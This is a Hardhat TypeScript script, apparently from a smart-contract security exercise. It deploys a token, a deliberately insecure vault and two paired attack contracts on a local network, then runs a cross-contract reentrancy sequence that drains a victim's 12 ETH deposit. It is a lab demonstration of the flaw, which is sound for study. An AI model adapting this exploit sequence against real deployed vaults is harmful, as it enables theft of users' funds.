import { ethers } from "hardhat";

// npx hardhat run scripts/Vulnerability/FailedRandom.ts
async function attack() {
    const [deployer, acc1] = await ethers.getSigners();

    const ethValue = ethers.utils.parseEther("1");


    const MoonTokenFatctory = await ethers.getContractFactory("MoonToken");
    const MoonToken = await MoonTokenFatctory.deploy();
    await MoonToken.deployed();
    console.log(`deployed MoonToken to ${MoonToken.address}`);

    const InsecureMoonVaultFatctory = await ethers.getContractFactory("InsecureMoonVault");
    const InsecureMoonVault = await InsecureMoonVaultFatctory.deploy(MoonToken.address);
    await InsecureMoonVault.deployed();
    console.log(`deployed InsecureMoonVault to ${InsecureMoonVault.address}`);

    await MoonToken.transferOwnership(InsecureMoonVault.address)

    const AttackFatctory = await ethers.getContractFactory("AttackCrossContract");
    const Attack1 = await AttackFatctory.deploy(MoonToken.address, InsecureMoonVault.address);
    await Attack1.deployed();
    console.log(`deployed Attack to ${Attack1.address}`);
    const Attack2 = await AttackFatctory.deploy(MoonToken.address, InsecureMoonVault.address);
    await Attack2.deployed();
    console.log(`deployed Attack to ${Attack2.address}`);
    await Attack1.setAttackPeer(Attack2.address)
    await Attack2.setAttackPeer(Attack1.address)


    await InsecureMoonVault.connect(acc1).deposit({value:ethers.utils.parseEther("12")})

    let InsecureMoonVault_balance = await ethers.provider.getBalance(InsecureMoonVault.address);
    console.log("InsecureMoonVault_balance:", InsecureMoonVault_balance.toString())

    //await AttackWrapper.attack(6,{value:ethValue})

    await Attack1.attackInit({value:ethValue})
    console.log("Attack1.attackInit finish")
    const attack2_balance = await InsecureMoonVault.getUserBalance(Attack2.address)
    console.log("attack2_balance:", attack2_balance.toString())
    console.log("1.0 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.0 Attack1.attackNext")
    await Attack1.attackNext()
    console.log("1.1 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.2 Attack1.attackNext")
    await Attack1.attackNext()
    console.log("1.3 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.3 Attack1.attackNext")
    await Attack1.attackNext()
    console.log("1.4 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.4 Attack1.attackNext")
    await Attack1.attackNext()
    console.log("1.5 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.5 Attack1.attackNext")
    await Attack1.attackNext()
    console.log("1.6 Attack2.attackNext")
    await Attack2.attackNext()
    console.log("2.6 Attack1.attackNext")
    await Attack1.attackNext()

    console.log("balacne:", (await Attack1.getBalance()).toString())
    console.log("balacne:",(await Attack2.getBalance()).toString())
    InsecureMoonVault_balance = await ethers.provider.getBalance(InsecureMoonVault.address);
    console.log("InsecureEtherVault_balance:", InsecureMoonVault_balance.toString())
}



async function main() {
    await attack();
    //await attack_failed();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
